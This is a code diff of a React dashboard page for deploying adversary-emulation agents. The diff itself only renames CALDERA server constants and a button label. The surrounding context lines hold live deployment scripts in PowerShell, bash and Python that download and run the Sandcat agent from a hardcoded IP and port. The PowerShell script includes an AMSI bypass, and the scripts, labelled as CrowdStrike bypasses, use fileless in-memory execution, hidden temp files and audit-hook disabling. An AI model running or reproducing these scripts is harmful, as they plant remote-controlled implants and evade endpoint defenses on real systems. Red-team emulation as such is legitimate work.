@@ -19,8 +19,8 @@ import {
   RefreshCw
 } from 'lucide-react';
 
-const CALDERA_SERVER = '137.184.7.224';
-const CALDERA_PORT = '8888';
+const EMULATION_SERVER = '137.184.7.224';
+const EMULATION_PORT = '8888';
 
 // Agent deployment scripts with CrowdStrike bypass techniques
 const DEPLOYMENT_SCRIPTS = {
@@ -29,7 +29,7 @@ const DEPLOYMENT_SCRIPTS = {
     icon: '⚡',
     description: 'Stealthy PowerShell deployment with AMSI bypass and memory-only execution',
     basic: `# Basic Sandcat Agent Deployment
-$server="${CALDERA_SERVER}:${CALDERA_PORT}";
+$server="${EMULATION_SERVER}:${EMULATION_PORT}";
 $url="http://$server/file/download";
 $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("platform","windows");
@@ -44,7 +44,7 @@ Start-Process -FilePath "C:\\Users\\Public\\$name" -ArgumentList "-server http:/
 $a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);
 
 # Download and execute in memory
-$server="${CALDERA_SERVER}:${CALDERA_PORT}";
+$server="${EMULATION_SERVER}:${EMULATION_PORT}";
 $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("platform","windows");
 $wc.Headers.add("file","sandcat.go");
@@ -96,7 +96,7 @@ $t.Invoke();`
     description: 'Linux/macOS deployment with process hollowing and fileless execution',
     basic: `#!/bin/bash
 # Basic Sandcat Agent Deployment
-server="${CALDERA_SERVER}:${CALDERA_PORT}"
+server="${EMULATION_SERVER}:${EMULATION_PORT}"
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
   "http://\${server}/file/download" > /tmp/.cache_update
 chmod +x /tmp/.cache_update
@@ -104,7 +104,7 @@ nohup /tmp/.cache_update -server "http://\${server}" -group red &>/dev/null &
 rm -f /tmp/.cache_update`,
     stealthy: `#!/bin/bash
 # CrowdStrike Falcon Bypass - Fileless Execution
-server="${CALDERA_SERVER}:${CALDERA_PORT}"
+server="${EMULATION_SERVER}:${EMULATION_PORT}"
 
 # Create memfd (memory-only file descriptor)
 exec 3<>/dev/shm/.$(head -c 8 /dev/urandom | xxd -p)
@@ -158,7 +158,7 @@ import urllib.request
 import subprocess
 import os
 
-server = "${CALDERA_SERVER}:${CALDERA_PORT}"
+server = "${EMULATION_SERVER}:${EMULATION_PORT}"
 req = urllib.request.Request(f"http://{server}/file/download")
 req.add_header("file", "sandcat.go")
 req.add_header("platform", "darwin" if os.name != "nt" else "windows")
@@ -179,7 +179,7 @@ import urllib.request
 import sys
 import os
 
-server = "${CALDERA_SERVER}:${CALDERA_PORT}"
+server = "${EMULATION_SERVER}:${EMULATION_PORT}"
 
 # Disable Python audit hooks
 if hasattr(sys, 'addaudithook'):
@@ -303,7 +303,7 @@ export default function AgentDeploy() {
             </div>
             <div className="flex items-center gap-2">
               <span className="text-xs text-muted-foreground">Target Server:</span>
-              <code className="px-2 py-1 bg-primary/20 text-primary text-sm font-mono">{CALDERA_SERVER}:{CALDERA_PORT}</code>
+              <code className="px-2 py-1 bg-primary/20 text-primary text-sm font-mono">{EMULATION_SERVER}:{EMULATION_PORT}</code>
             </div>
           </div>
         </div>
@@ -533,11 +533,11 @@ export default function AgentDeploy() {
               <div className="grid grid-cols-2 gap-4 text-sm">
                 <div>
                   <span className="text-muted-foreground">C2 Server:</span>
-                  <code className="ml-2 text-primary">{CALDERA_SERVER}</code>
+                  <code className="ml-2 text-primary">{EMULATION_SERVER}</code>
                 </div>
                 <div>
                   <span className="text-muted-foreground">Port:</span>
-                  <code className="ml-2 text-primary">{CALDERA_PORT}</code>
+                  <code className="ml-2 text-primary">{EMULATION_PORT}</code>
                 </div>
                 <div>
                   <span className="text-muted-foreground">Protocol:</span>
@@ -549,10 +549,10 @@ export default function AgentDeploy() {
                 </div>
               </div>
               <div className="mt-4 flex gap-2">
-                <a href={`http://${CALDERA_SERVER}:${CALDERA_PORT}`} target="_blank" rel="noopener noreferrer">
+                <a href={`http://${EMULATION_SERVER}:${EMULATION_PORT}`} target="_blank" rel="noopener noreferrer">
                   <Button size="sm" className="font-display">
                     <Zap className="w-4 h-4 mr-1" />
-                    OPEN CALDERA
+                    OPEN EMULATION UI
                   </Button>
                 </a>
                 <Link href="/agents">
